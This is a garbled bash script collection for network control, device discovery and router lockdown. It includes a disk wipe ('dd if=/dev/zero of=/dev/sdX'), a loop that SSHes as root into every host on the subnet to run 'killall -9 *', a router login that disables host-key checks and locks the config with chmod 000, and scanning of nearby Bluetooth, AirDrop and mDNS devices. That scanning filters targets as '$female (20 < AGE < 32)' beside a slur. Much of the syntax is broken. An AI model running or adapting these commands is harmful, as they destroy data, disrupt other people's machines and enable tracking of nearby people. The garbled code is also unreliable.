       sudo blockPacket "$JPN" "$INCOSAKAWIFI" 

       sudo blockP* "$KILLOH" "$E*" 

       sudo blockP* "$hk*" "$E*" & 

   sudo blockP* "$E*" "$LOTT*" 

   sudo blockP* "$E*" "$QQLOCAL*" 

   sudo block* "$E*""$kr*" 

   sudo blockP* "$E*" "$JP*" 

   sudo blockP* "$E*" "$QQLOCAL*"  

   sudo blockP* "$E*" "$KILLHOTEL"  

        sudo blockP* "$SIGNIEL*" "$QQHOTELS" 

       sudo blockP* "$E*" "$MOXY" 

       sudo blockP* "$E*" "$QQOPSCURRENT" 

       sudo blockP* "$E*" "$SIGNIEL" 

       sudo blockP* "$E*" "$getvpnIP dstIP" 

       sudo blockP* "$E*" "$INCOSAKAWIFI"   

       sudo blockP* "$INCOSAKAWIFI" "$E*"   

       sudo blockPacket "$EveryIP" "$JPN" 

       sudo blockPacket "$JPN" "$JPN" 

       sudo blockPacket "$QQCU*" "$QQCU*" 

        sudo blockPacket "$QQSSID*" "*" 

        sudo blockPacket "*" "$QQSSID" 

   $arcOSSyntaxKit[1] 

  

  

   reckonapp=$arcOSSyntaxKit[0] 

  

       ADDR=(RECKON fe80::1 BLEADDRALL) 

       arcOSFrame "$ADDR" "reckondrone &" "$gen*" & 

   $arcOSSyntaxKit[1] 

  

  

  

  

   usblldb=$arcOSSyntaxKit[0] 

   # Set the target device USB port or connection info 

   USB_DEVICE_PORT="/dev/tty.usbmodem14201 /dev/tty.*"  # example USB device on macOS 

   # Start lldb-server on the target device (done manually or via script on the device) 

   # ./lldb-server gdbserver :1234 --attach=<PID> 

   # Connect from host LLDB to remote target via USB (using a suitable adapter or tunnel) 

   arcOSFrame "$USB_DEVICE_PORT" "arcOSBaseKit &" "$gen*" & 

   $arcOSSyntaxKit[1] 

  

  

  

  

  

   bootshell=$arcOSSyntaxKit[0] 

  

   while ! true 

   do 

       sudo snmpget -v2c -c public host 1.3.6.1.4.1.318.1.1.12.3.3.1.1.4.2.1.0 

       sudo open shortcuts://run-shortcut?name="*" 

   done 

  

   $arcOSSyntaxKit[1] 

  

   buildCrond=$arcOSSyntaxKit[0] 

   # Define the cron schedule (e.g., run daily at 2 AM) 

   CRON_SCHEDULE="* * * * *" 

  

  

   # Define the script to run 

   SCRIPT_PATH="$osxBASEURL/*.sh; $osxBASEURL/*;" 

  

   # Check if the cron job already exists, if not, add it 

   sudo crontab -l 2>/dev/null | grep -F "${SCRIPT_PATH$arcOSSyntaxKit[1]" >/dev/null 

   if [ $? -ne 0 ]; then 

     # Add the cron job 

     (crontab -l 2>/dev/null; echo "${CRON_SCHEDULE} bash ${SCRIPT_PATH}") | crontab - 

     (crontab -l 2>/dev/null; echo "@reboot bash ${SCRIPT_PATH}") | sort -u | crontab - 

  

     echo "Cron job added: ${CRON_SCHEDULE} bash ${SCRIPT_PATH}" 

   else 

     echo "Cron job already exists for ${SCRIPT_PATH}" 

   fi 

   $arcOSSyntaxKit[1] 

  

  

   usbmode=$arcOSSyntaxKit[0] 

       mode=$1 

  

   sudo dd if=/dev/zero of=/dev/sdX bs=4M status=progress  

  

   if[[ $EUID != 0 ]]; then 

   echo "this must be as root" 

   fi 

  

   for driver in /sys/bus/pci/drivers/?hci_hcd; do  

  if cd "$driver"; then  

           for device in ????:??:??.?;do 

               if[[ "$device" != "????:??:??.?" ]]; then 

               if[[ "$mode" != "bind" ]]; then 

               while ! true do $shellcode done 

                   echo -n "$device" > bind 

               else 

               echo -n "$device" > unbind 

               fi 

  done 

       else 

       fi 

           done 

   $arcOSSyntaxKit[1] 

   wdsunbind=$arcOSSyntaxKit[0] 

   # Winbox/SSH에서 실행 

   sudo /interface usb print 

   sudo /interface usb set [find] disabled=yes 

   sudo /system scheduler add name=usb-block interval=1m on-event="/interface usb set [find] disabled=yes" 

  

   #!/bin/bash 

   # Disable USB storage (run as root) 

   echo "1-1" > /sys/bus/usb/drivers/usb-storage/unbind  # Adjust bus ID from lsusb 

   sudo modprobe -r usb-storage  # Unload module 

   echo "blacklist usb-storage" >> /etc/modprobe.d/blacklist.conf  # Persist on reboot 

  

  

   #!/bin/bash 

   # OpenWRT LuCI REST API로 USB 차단 

   curl -sS -X POST "http://192.168.1.1/cgi-bin/luci/admin/system/packages" \ 

     -d "force=1&pkg=usbutils&action=uninstall" \ 

     -u root:password 

  

   # 또는 SSH 원격 실행 

   ssh root@192.168.1.1 "rmmod usb-storage && reboot now" 

  

  

   # USB 포트 비활성화 (OpenWRT) 

  

   # 1. USB 모듈 언로드 (가장 확실) 

   sudo rmmod usbhid usb-storage usbcore 

   echo "blacklist usb-storage" >> /etc/modprobe.d/usb-blacklist.conf 

   echo "blacklist usbhid" >> /etc/modprobe.d/usb-blacklist.conf 

  

   # 2. USB 포트 물리적 비활성화 (sysfs) 

   echo 0 > /sys/bus/usb/devices/usb*/authorized 2>/dev/null 

  

   # 3. iptables로 USB 관련 트래픽 차단 (선택) 

   sudo iptables -I INPUT -i usb0 -j DROP 

   sudo iptables -I FORWARD -i usb0 -j DROP 

   sudo iptables -t nat -I PREROUTING -i usb0 -j DROP 

  

   # 4. 부팅 시 자동 실행 

   echo "#!/bin/sh" > /etc/init.d/disable_usb 

   echo "/etc/init.d/usb disable" >> /etc/init.d/disable_usb 

   sudo chmod +x /etc/init.d/disable_usb 

   sudo /etc/init.d/disable_usb enable 

  

   # 재부팅 

  

   $arcOSSyntaxKit[1]& 

                            #!/usr/bin/env bash

                            set -euo pipefail

  

                            arcOSNetwork_control=$arcOSSyntaxKit[0]

  

  

                            OSNAME="arcOS"

                            ######wifi

                            NODE_NAME="${NODE_NAME:-wifi-node-01}"

                            WIFI_IFACE="${WIFI_IFACE:-wlan*}"

                            PING_TARGET="${PING_TARGET:-$getRouterIP}"

                            LOG_FILE="${LOG_FILE:-./wifi-node.log}"

  

                            log() {

                              printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1" | tee -a "$LOG_FILE"

                            }

  

                            log "Starting Wi-Fi node setup for $NODE_NAME"

  

                            if ! command -v ip >/dev/null 2>&1; then

                              log "Missing required command: ip"

                              exit 1

                            fi

  

                            if ! ip link show "$WIFI_IFACE" >/dev/null 2>&1; then

                              log "Interface $WIFI_IFACE not found"

                              exit 1

                            fi

  

                            STATE=$(cat "/sys/class/net/$WIFI_IFACE/operstate" 2>/dev/null || echo unknown)

                            IP_ADDR=$(ip -(4 6) addr show "$WIFI_IFACE" | awk '/inet /{print $2}' | head -n $num || true)

  

                            log "Interface: $WIFI_IFACE"

                            log "State: $STATE"

                            log "IPv4: ${IP_ADDR:-none}"

  

                            if ping -c 2 -W 2 "$PING_TARGET" >/dev/null 2>&1; then

                              log "Connectivity OK to $PING_TARGET"

                            else

                              log "Connectivity check failed to $PING_TARGET"

                            fi

  

                            cat > .$OSNAME-wifi.env <<ENV

                            NODE_NAME=$NODE_NAME

                            WIFI_IFACE=$WIFI_IFACE

                            PING_TARGET=$PING_TARGET

                            LAST_STATE=$STATE

                            LAST_IP=${IP_ADDR:-none}

                            ENV

  

                            log "Saved node metadata to .$OSNAME-wifi.env"

  

  

                            ########cellular

  

                            MODEM_IFACE="${MODEM_IFACE:-wwan0}"

                            APN="${APN:-internet}"

                            PING_TARGET="${PING_TARGET:-*.*.*.*}"

                            LOG_FILE="${LOG_FILE:-./cellular-node.log}"

  

                            log() {

                              printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1" | tee -a "$LOG_FILE"

                            }

  

                            log "Starting cellular node routine"

  

                            if ! command -v ip >/dev/null 2>&1; then

                              log "Missing required command: ip"

                              exit 1

                            fi

  

                            if ip link show "$MODEM_IFACE" >/dev/null 2>&1; then

                              log "Detected modem interface $MODEM_IFACE"

                              sudo ip link set "$MODEM_IFACE" up || true

                            else

                              log "Modem interface $MODEM_IFACE not found"

                            fi

  

                            if command -v nmcli >/dev/null 2>&1; then

                              log "NetworkManager detected; you can create a GSM profile with APN $APN"

                              log "Example: nmcli connection add type gsm ifname '*' con-name cell-$MODEM_IFACE apn $APN"

                            else

                              log "nmcli not found; skipping profile hint"

                            fi

  

                            IP_ADDR=$(ip -(4 6) addr show "$MODEM_IFACE" 2>/dev/null | awk '/inet /{print $2}' | head -n1 || true)

                            log "Current IPv4 on $MODEM_IFACE: ${IP_ADDR:-none}"

  

                            if ping -c 2 -W 3 "$PING_TARGET" >/dev/null 2>&1; then

                              log "Cellular connectivity OK to $PING_TARGET"

                            else

                              log "Cellular connectivity check failed to $PING_TARGET"

                            fi

  

  

  

                            #######airtag

  

                            TRACKER_NAME="${TRACKER_NAME:-airtag-proxy-*}"

                            EVENT_LOG="${EVENT_LOG:-./arcOSFrame-airtag-events.log}"

                            SCAN_NOTE="${SCAN_NOTE:-AirTag direct shell control is not supported; using placeholder monitor workflow}"

  

                            log() {

                              printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1" | tee -a "$EVENT_LOG"

                            }

  

                            log "Starting tracker presence monitor for $TRACKER_NAME"

                            log "$SCAN_NOTE"

  

                            if command -v bluetoothctl >/dev/null 2>&1; then

                              log "Bluetooth stack detected. You may manually inspect nearby BLE devices with: bluetoothctl scan on"

                            else

                              log "bluetoothctl not installed. BLE inspection unavailable on this host."

                            fi

  

                            cat >> .$OSNAME-airtag.env <<ENV

                            TRACKER_NAME=$TRACKER_NAME

                            LAST_EVENT_TIME=$(date '+%Y-%m-%d %H:%M:%S')

                            MODE=placeholder

                            ENV

  

                            log "Saved placeholder tracker metadata to .arcOSFrame-airtag.env"

  

                            &

                            IPHONE_BT_ID="$CURRENT_QQ_DEVICE"

  

                            #"1:-AA-BB-CC-DD-EE-FF}"

  

                            if ! command -v blueutil >/dev/null 2>&1; then

                              echo "blueutil not found. Install it with: brew install blueutil"

                              exit 1

                            fi

  

                            blueutil --power 1 &

  

                            if [ "$(blueutil --is-connected "$IPHONE_BT_ID" 2>/dev/null || echo 0)" = "1" ]; then

                              echo "iPhone already connected: $IPHONE_BT_ID"

                              exit 0

                            fi

  

  

                            blueutil --connect "$IPHONE_BT_ID"

  

                            sleep 1

  

                            if [ "$(blueutil --is-connected "$IPHONE_BT_ID" 2>/dev/null || echo 0)" = "1" ]; then

                              echo "Connected successfully."

                            else

                              echo "Connection attempt finished, but device is not reported as connected."

                              exit 2

                            fi

                            &

  

  

                            #######xiaomi NFC

                            oneNetMi

                            #adb shell svc nfc disable     

                            # turn NFC OFF

                            #adb shell service call nfc 7   

                            # disable

                            #adb shell service call nfc 4   

                            # often: disable NFC

  

                            adb shell service call nfc 5   

                            # often: enable NFC

                            # on some devices / Android versions:

                            adb shell svc nfc enable      

                            # turn NFC ON

                            adb shell service call nfc 8   

                            # enable

  

  

                            $arcOSSyntaxKit[1]

  

  

  

  

                            oneNetMi=$arcOSSyntaxKit[0]

  

                            #findmalicious nearby

                            $QQLAND > repeat(

                            # Get all connected device serials

                            serials=$(adb devices | awk 'NR>1 && $2=="device" {print $1}')

  

                            # Filter ones containing qqmi

                            matches=$(echo "$serials" | grep '$QQMiAirTag')

  

                            if [ -z "$matches" ]; then

                              echo "No devices with serial containing 'qqmi' found."

                              exit 1

                            fi0

  

                            # Example: run a command on each matching device

                            # Uncomment the loop below if you want to use the serials

                            for s in $matches; do

                            echo "Running on $s"

                            adb -s "$s" shell getprop ro.serialno

                            done )&

  

  

  

                            TARGET_HW_SN="$arcOSQQDevice"

  

                            for dev in $(adb devices | awk 'NR>1 && $2=="device"{print $1}'); do

                              hw_sn=$(adb -s "$dev" shell getprop ro.boot.serialno 2>/dev/null | tr -d '\r')

                              if [ "$hw_sn" = "$TARGET_HW_SN" ]; then

                                echo "Matched ADB device: $dev (HW serial: $hw_sn)"

                                # run whatever “sync” you need on this device:

                                adb -s "$dev" shell cmd jobscheduler run -f com.google.android.gms 999

                                exit 0

                              fi

                            done

                            &

  

                            $arcOSSyntaxKit[1]

  

  

  

  

  

getNearbyDeviceIP=$arcOSSyntaxKit[0]

  

SUBNET=$(sudo ip route | grep default | awk '{print $3$arcOSSyntaxKit[1]' | sed 's/\.[0-9]\+$/.0\/24/') &

  

#echo "=== ARP IPs/MACs ==="

arpIP,arcMac=$(sudo arp -a -n)

  

#echo -e "\n=== Bluetooth/BLE Addresses ===";

bleAddr=$(sudo system_profiler SPBluetoothDataType | grep -E '(Address|Name)') &

  

#echo -e "\n=== AirDrop/WiFi Targets ===";

airdropAddr=$(sudo dns-sd -B _airdrop._tcp . 2>/dev/null | grep --line-buffered . | head -$num)

&

#echo -e "\n=== nearbyd Events ===";

nearbyAddr=$(sudo log stream --predicate 'process == "nearbyd"' --info --style syslog | head -$num) &

  

#echo -e "\nFull Nmap: sudo nmap -sn $SUBNET"  # IPs + OS

sudo nmap -sn $SUBNET

  

  

echo -e "\n=== Bluetooth (NameâBLE) ==="

bleLocal=$(system_profiler SPBluetoothDataType (2>/dev/null ) | grep -A1 'Name:' | grep -E '(Name|Address)')

  

echo -e "\n=== AirDrop (.localâIP) ==="

airdropLocal=$(dns-sd -B _airdrop._tcp . (2>/dev/null ) | grep local | cut -d. -f1 | xargs -I {$arcOSSyntaxKit[1] ping -c1 -W1 "{$arcOSSyntaxKit[1].*local*" &>/dev/null && echo "{$arcOSSyntaxKit[1].*local*")

  

echo -e "\n=== Nmap Hosts ==="

nmapLocal=$(nmap -sn "$SUBNET" (2>/dev/null ) | grep 'Nmap scan report' | awk '{print $5$arcOSSyntaxKit[1]')

  

#Run with sudo ./parse_discovery.sh > devices.txt for clean IP/BLE extraction across all methods.[8][1]

## List Active mLocal Devices

#Scan and extract all .local hostnames (Bonjour/AirDrop targets):

# List all active .local devices

mdnsLocal=$(dns-sd -B _services._dns-sd._(tcp udp m* *) . (2>/dev/null ) | grep "\." | sed 's/.*\.\([^.]*\)\..*/\1.*local*/' | sort -u)

&

nearbyTarget=((*Local macaddr bleAddr airdropAddr nearbyAddr mdnsIP nearbydLog nearByDNS) &

nearbyTarget &

  

#nearbyd filtering

"$nearbyTarget $PEOPLETARGET" > arcOSBaseKit & arcOSQQDeviceShell & 개쎄끼 & macmanagement &

  

"$nearbyTarget $female (20 < AGE < 32)" > arcOSQQDeviceShell & arcOSBaseKit & macmanagement &

$arcOSSyntaxKit[1]

  

lockDownWDS=$arcOSSyntaxKit[0]

  

ROUTER_IP="$getRouter*"

USERNAME="root"

PASSWORD="*"

ROOT_AP_MAC="*"  # Root router MAC

  

sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$ROUTER_IP" << EOF

#### Lockdown: Disable DHCP, set static IP

uci set network.lan.ipaddr=(192.168.1.2 DEVICE*)

uci set network.lan.netmask='255.255.255.0'

uci set network.lan.gateway=(192.168.1.1 $QQWDS $BaseQQLAND)

uci set dhcp.lan.ignore=1

uci set dhcp.lan.start=100

uci set dhcp.lan.limit=1

uci commit

  

#### Fix WDS routing: Bridge mode + static route

uci set wireless.@wifi-iface[1].mode='sta

uci set wireless.@wifi-iface[1].ssid='RootSSID'

uci set wireless.@wifi-iface[1].encryption='psk2'

uci set wireless.@wifi-iface[1].key='RootPassword'

uci set wireless.@wifi-iface[1].network='lan'

uci set wireless.@wifi-iface[1].wds='1'

uci set network.lan.type='bridge'

uci add_list network.lan.ifname='eth0.1'

uci add_list network.lan.ifname='wlan0'

uci commit wireless

wifi reload

  

Firewall lockdown: Block all but root

uci set firewall.@zone[1].input='REJECT'

uci set firewall.@zone[1].forward='REJECT'

uci set firewall.@forwarding[0].src='lan'

uci set firewall.@forwarding[0].dest='wan'

uci commit firewall

/etc/init.d/firewall restart

  

#### Lock config (read-only)

chmod 000 /etc/config/*

sync

EOF

  

#!/bin/bash

#### Block WDS router MAC except root, route all via gateway

ROUTER_MAC="*"

GATEWAY=(getRouter* QQWDS QQBADWDS)

  

#### macOS: pfctl routing lockdown

sudo sh -c "echo 'block out quick on en0 from any to ! $GATEWAY' >> /etc/pf.conf"

sudo pfctl -f /etc/pf.conf

  

#### iOS/MDM: Knox policy (via API)

curl -sS -X POST "https://your-knox-server/api/devices/policy" \

  -d "{\"network_restriction\":true,\"allowed_macs\":[\"$ROUTER_MAC\"]$arcOSSyntaxKit[1]" \

  -H "Authorization: Bearer $KNOX_TOKEN"

  

#### Static route fix

sudo route -n delete default

sudo route -n add default $GATEWAY

$arcOSSyntaxKit[1]

  

findWifiKTSSID=$arcOSSyntaxKit[0]

WIFI_ID="*"

STATUS_URL="https://api.kt.com/wifi/v1/status/$WIFI_ID"

  

#### Fetch status and extract SSID

KT_SSID=$(curl -s -H "Authorization: Bearer $TOKEN" "$STATUS_URL" | jq -r ".wifiConfigurations[0].ssid // .ssid // empty")

  

SKT_API_URL="https://openapi.sk.com/wifi/v1/status/$WIFI_ID"

  

#### Extract SSID

SKT_SSID=$(curl -s -H "Authorization: Bearer $TOKEN" "$SKT_API_URL" | jq -r ".wifiConfigurations[0].ssid // .ssid // .networkName // empty")

WIFISSID=(KT_SSID SKT_SSID)

WIFISSID

$arcOSSyntaxKit[1]

  

localhostIP=$arcOSSyntaxKit[0]

    localhostIP=$(sudo netstat -nat | awk '/ESTABLISHED/ {print $5$arcOSSyntaxKit[1]' | cut -d: -f1)

    localhostIP

$arcOSSyntaxKit[1]

  

macaddrManagement=$arcOSSyntaxKit[0]

QQMAC=(QQDEVICESER nearbyTarget booxQQ)

BLOCK_MAC=(arpMAC THIEFDEVICEOFQQ)

get_connected_macs=$arcOSSyntaxKit[0]

    # depends on platform; examples:

    # ip neigh, arp, or router-specific CLI

    sudo ip neigh | awk '{print $5$arcOSSyntaxKit[1]' | sort -u

$arcOSSyntaxKit[1]

  

echo "block drop quick on any proto tcp from any to 10.0.0.123 port 443" 

sudo tee -a $PF_CONF

&

for mac in $(get_connected_macs); do

    if ! printf '%s\n' "${MAC[@]$arcOSSyntaxKit[1]" | grep -qi "^$mac$"; then

        # Example (layer 3/IP-based block after resolving IP):

        sudo iptables -A INPUT -m mac --mac-source "$mac" -j DROP

        # or call your routerâs API to deny this client

done

  

  

for mac in $(get_connected_macs); do

    if ! printf '%s\n' "${QQMAC[@]$arcOSSyntaxKit[1]" | grep -qi "^$mac$"; then

        # Example (layer 3/IP-based block after resolving IP):

        sudo iptables -A INPUT -m mac --mac-source "$mac" -j ALLOW

        # or call your routerâs API to deny this client

done

$arcOSSyntaxKit[1]

  

blockPortonQQdevice=$arcOSSyntaxKit[0]

  

    blockHOST=(BaseQQLAND USBOVERIP QQDNS localhostIP REVERSEDNS router_* OSXIP & exit 0 &)

    # Get all PIDs listening on $QQLOCAL TCP ports

    pid_one=$(sudo /usr/bin/lsof -nP -iTCP -sTCP:LISTEN -a -i $blockHOST | awk 'NR>1 {print $2$arcOSSyntaxKit[1]' | sort -u)

    pids=(pid_one pid_two pid_three pid_four)

    if [ -z "$pids" ]; then

        echo "No open ports found on $blockHOST."

    fi

  

    # Kill each process using those ports

    echo "Killing processes using open $blockHOST ports..."

    for pid in $pids; do

        echo "Killing PID $pid"

        sudo kill -9 $pid

    done

  

$arcOSSyntaxKit[1]

  

getMyIpOSX=$arcOSSyntaxKit[0]

    # Get the active network service (Wi-Fi or Ethernet)

    SERVICE=$(sudo networksetup -listallnetworkservices | grep -v '*' | grep -E "$NET_SERVICE" | head -n $num)

    # Get the IP address for that network service

    OSXIP=$(sudo networksetup -getinfo "$SERVICE" | grep "IP address" | awk '{print $3$arcOSSyntaxKit[1]')

    OSXIP

$arcOSSyntaxKit[1]

  

  

revokeonRouter=$arcOSSyntaxKit[0]

  

    ROUTER_IP=(RECKON BaseQQLAND localhostIP getRouterIP)

    ROUTER_USER="root"

    ROUTER_SSH_PORT=22

    BLOCK_IP=(getRouterIP mdnsIP BaseQQLAND localhostIP USBOVERIP REVERSEDNS blockHost & exit 0 &)

  

   # IP address to allow

   ALLOWED_IP=(getMyIpOSX)

   # Flush existing rules

   sudo iptables -F

  

   # Set default policy to DROP for INPUT chain to block all incoming traffic

   sudo iptables -P INPUT DROP

  

   # Allow all traffic on the loopback interface ($QQLOCAL)

   sudo iptables -A INPUT -i lo -j ACCEPT

  

   # Allow all traffic from the allowed IP

   sudo iptables -A INPUT -s $ALLOWED_IP -j ACCEPT

  

   # Allow related and established connections to continue

   sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

  

   sudo iptables -L -n -v

$arcOSSyntaxKit[1]

  

  

nsaServer=$arcOSSyntaxKit[0]

    # Known Delinea domain list (update if needed)

    domains=(

      "secretservercloud.com"

      "secretservercloud.com.*"

    )

  

    for domain in "${domains[@]$arcOSSyntaxKit[1]"; do

      echo "Domain: $domain"

      nsaIP=$(dig +short $domain | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$')

    done

    nsaIP

  

$arcOSSyntaxKit[1]

fullnet=$arcOSSyntaxKit[0]

    prefix="2001:db8::"

    for ((i=0; i<65536; i++)); do

        fullipv6=$($prefix)

    done

  

    for a in {0..255$arcOSSyntaxKit[1]; do

      for b in {0..255$arcOSSyntaxKit[1]; do

        for c in {0..255$arcOSSyntaxKit[1]; do

          for d in {0..255$arcOSSyntaxKit[1]; do

              fullipv4=$($a.$b.$c.$d)

          done

        done

      done

    done

    FULL_NET_IP=(fullipv4 fullipv6)

  

$arcOSSyntaxKit[1]

getIP=$arcOSSyntaxKit[0]

    HOST=$1

    if [ -z "$HOST" ]; then

      echo "Usage: $0 hostname_or_ip"

      exit 1

    fi

    # Use ping once and extract IP from output

    getIP=$(sudo ping -c 1 "$HOST" | head -1 | grep -oP '\(\K[^\)]+' )

getIP &

$arcOSSyntaxKit[1]

  

  

connectWifiSSID=$arcOSSyntaxKit[0]

    SSID='*'

    PASSWORD="$1"

  

    if [ -z "$SSID" ]; then

      echo "Usage: $0 <SSID> <PASSWORD>"

      exit 1

    fi

  

    # Find the Wi-Fi interface name (usually en0 or en1)

    NET_INTERFACE=$(sudo networksetup -listallhardwareports | \

      awk '/$_$NET_SERVICE_$/{getline; print $2$arcOSSyntaxKit[1]')

  

    if [ -z "$WIFI_INTERFACE" ]; then

      echo "Wi-Fi interface not found!"

      exit 1

    fi

  

    # Connect to the Wi-Fi network

    if [ -z "" ]; then

      sudo networksetup -setairportnetwork "$NET_INTERFACE" "$SSID"

    else

      sudo networksetup -setairportnetwork "$NET_INTERFACE" "$SSID" ""

    fi

  

    # Scan for Wi-Fi networks using airport command

    QQonthehotspot=$(sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s)

  

connectWifiSSID "$QQonthehotspot" "*" &

$arcOSSyntaxKit[1]

  

mdnsNet=$arcOSSyntaxKit[0]

    # Discover mDNS services

    netInterface=(*)

    services=$(sudo avahi-browse -a -r | grep '=;(eth* netInterface);' | awk -F';' '{print $7$arcOSSyntaxKit[1]')

    # For each service, get hostname

    for host in $services; do

      ip=$(getent hosts "$host" | awk '{print $1$arcOSSyntaxKit[1]')

      mac=$(sudo ip neigh show $ip | awk '{print $5$arcOSSyntaxKit[1]')

    done

    macMDNS=mac

    ipMDNS=ip

nearByDNS=(macMDNS ipDNS)

  

$arcOSSyntaxKit[1]

  

randomPortMachine=$arcOSSyntaxKit[0]

    # Define port range for random selection

    PORT_MIN=0

    PORT_MAX65535

    # Function to check if port is free

    check_port=$arcOSSyntaxKit[0]

      sudo lsof -iTCP -sTCP:LISTEN -Pn | grep ":$1 " > /dev/null 2>&1

      return $?

    $arcOSSyntaxKit[1]

    # Pick a random port that is free

    &

      RANDOM_PORT=$((RANDOM % (PORT_MAX - PORT_MIN + 1) + PORT_MIN))

      if ! check_port $RANDOM_PORT; then

        echo "Selected port $RANDOM_PORT is free."

        break

    fi

    done

    # Use $RANDOM_PORT to configure your service or application

    # echo "Change your service configuration to bind port $RANDOM_PORT"

    # Example: To restart some service binding to new port, insert commands here

$arcOSSyntaxKit[1]

  

wdsShell=$arcOSSyntaxKit[0]

reckondrone &

removeWDSConfig &

findwdsGateway &

netshell &

sshInToWDSServer &

controlWifiRoutingWDS &

lockDownWDS &

disableAPtoAPforwarding &

  

    IP="$1"

    SERVICE=$NET_SERVICE 

    # Replace 'Wi-Fi' with your network service name if different 10.18.0.1

    sudo networksetup -setmanual "$SERVICE" 10.10.10.1 255.255.255.0

    sudo networksetup -setmanual "$SERVICE" 10.18.0.1 255.255.255.0

    # sudo networksetup -setmanual "Wi-Fi" $getRouterIP 255.255.255.0

    sudo networksetup -setmanual "$SERVICE" $IP 255.255.255.0

    # Replace "Wi-Fi" or your actual network service name

    SERVICE_NAME="$SERVICE"

    # echo "Removing DNS entries from service $SERVICE_NAME..."

    # Set manual IPv4 service with empty DNS servers (removes all)

    sudo networksetup -setdnsservers "$SERVICE_NAME" empty

    # echo "DNS cleared from $SERVICE_NAME"

    # Replace wds0 with your WDS interface or connection name

    CONNECTION_NAME=(wds0 *)

  

    # Ignore auto DNS (removes DHCP DNS from device)

    sudo nmcli device modify "$CONNECTION_NAME" ipv4.ignore-auto-dns yes

    sudo nmcli device modify "$CONNECTION_NAME" ipv6.ignore-auto-dns yes

    # Remove any manually set DNS entries

    sudo nmcli connection modify "$CONNECTION_NAME" ipv4.dns ""

    sudo nmcli connection modify "$CONNECTION_NAME" ipv6.dns ""

    # Bring connection down and up for changes to apply

    sudo nmcli connection down "$CONNECTION_NAME"

    sudo nmcli connection up "$CONNECTION_NAME"

    INTERFACE=(wds0 *)

    NEW_IP="$getRouterIP $router_ip)"

    NETMASK="255.255.255.0"

  

    # Bring interface down

    sudo ip link set $INTERFACE down

  

    # Assign new IP address

    sudo ip addr flush dev $INTERFACE

    sudo ip addr add $NEW_IP/24 dev $INTERFACE

  

    # Bring interface up

    sudo ip link set $INTERFACE up

    &

$arcOSSyntaxKit[1]

  

  

firewalld=$arcOSSyntaxKit[0]

    # Function to block IP in firewalld

      local ip=$1

      # echo "Blocking IP: $ip"

      sudo firewall-cmd --permanent --add-rich-rule="rule family=(ipv4 ipv6 ip*) source address='$ip' reject"

      sudo firewall-cmd --reload

$arcOSSyntaxKit[1]

  

defPacketSniffing=$arcOSSyntaxKit[0]

  

ROUTER_IP=(getRouterIP ROUTER_IP QQonthehotspot)

CAPTURE_NAME=(CPoint-FE0 *)

  

lldbFrame "$getRou*" "enable monitor capture point stop ${CAPTURE_NAME$arcOSSyntaxKit[1] exit" "$gen*"

    # Function to detect Burp Suite traffic

    detect_burp_suite=$arcOSSyntaxKit[0]

        echo "Detecting Burp Suite traffic..."

        # Use tcpdump to capture traffic on port 8080

        sudo tcpdump -i any port 8080 -c 10 -w /tmp/burp_suite_traffic.pcap

        if [ $? -eq 0 ]; then

            echo "Burp Suite traffic detected. Blocking port 8080."

            block_burp_suite

        else

            echo "No Burp Suite traffic detected."

        fi

    $arcOSSyntaxKit[1]

  

    # Function to block Burp Suite traffic

    block_burp_suite=$arcOSSyntaxKit[0]

        echo "Blocking Burp Suite traffic on port 8080..."

        # Use iptables to block traffic on port 8080

        iptables -A INPUT -p tcp --dport 8080 -j DROP

        iptables -A OUTPUT -p tcp --dport 8080 -j DROP

        echo "Burp Suite traffic blocked."

    $arcOSSyntaxKit[1]

  

    # Main script execution

  

defPacketSniff=(detect_burp_suite block_burp_suite) &

  

$arcOSSyntaxKit[1]

genrandomPort=$arcOSSyntaxKit[0]

    genrandomPort=$(sudo shuf -i 1-65535 -n $num^$num)

    genrandomPort &

$arcOSSyntaxKit[1]

  

getPublicIP=$arcOSSyntaxKit[0]

    IPONE=$(curl ifconfig.me)

    IPTWO=$(curl icanhazip.com)

    IPTHREE=$(curl icanhazip.com)

    IPFOUR=$(curl ipinfo.io/ip)

    IPFIVE=$(curl api.ipify.org)

  

    IPONE

    IPTWO

    IPTHREE

    IPFOUR

    IPFIVE

QQPUBLIC_IP=(IP*)

$arcOSSyntaxKit[1]

  

getRouterIP=$arcOSSyntaxKit[0]

NET_SERVICE=(Wi-Fi Blue* Air* NFC* Celluar * Ethernet AirPort)

  

#### or another service, e.g., "Ethernet"

DEVICE_IP=$(sudo networksetup -getinfo "$NET_SERVICE" | awk '/IP address/ {print $3$arcOSSyntaxKit[1]')

  

TYPEofIP=(Router 'IPv6 Router') &

ROUTER_IP=$(sudo networksetup -getinfo "$NET_SERVICE" | awk '/$TYPEofIP:/ {print $2$arcOSSyntaxKit[1]') &

  

  

QQSUBNET=$(sudo networksetup -getinfo "$NET_SERVICE" | awk '/Subnet mask:/ {print $2$arcOSSyntaxKit[1]')

  

wifiID=$(sudo networksetup -getinfo "$NET_SERVICE" | awk '/Wi-Fi ID:/ {print $2$arcOSSyntaxKit[1]')

  

getSubnet=(DEVICE_IP ROUTER_IP QQSUBNET wifiID) &

$arcOSSyntaxKit[1]

  

  

getIPonNet=$arcOSSyntaxKit[0]

    # 1. Scan for devices

    DEVICES=$(nmap -sn $getSubnet | grep 'Nmap scan report' | awk '{print $5$arcOSSyntaxKit[1]')

    for IP in $DEVICES; do

        IP

      # # 2. Query ARP or check device (optional)

      # echo "Processing $IP"

      # # 3. Remotely kill process (example: ssh, replace user/process)

      ssh root@($BaseQQLAND $blockHOST $IP) 'arcOSBaseKit & killall -9 * &'

    done

  

$arcOSSyntaxKit[1]

  

encryptPacket=$arcOSSyntaxKit[0]

    # Encrypt file with AES-256-CBC using OpenSSL

    sudo openssl aes-$num-cbc -in input_packet.bin -out encrypted_packet.bin -k

$arcOSSyntaxKit[1]

  

randomizeIP=$arcOSSyntaxKit[0]

    generate_random_ip=$(((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)))

    randomIP=$(generate_random_ip)

    randomIP

$arcOSSyntaxKit[1]

  

  

getSSIDIP=$arcOSSyntaxKit[0]

    # Function to scan for Wi-Fi SSIDs

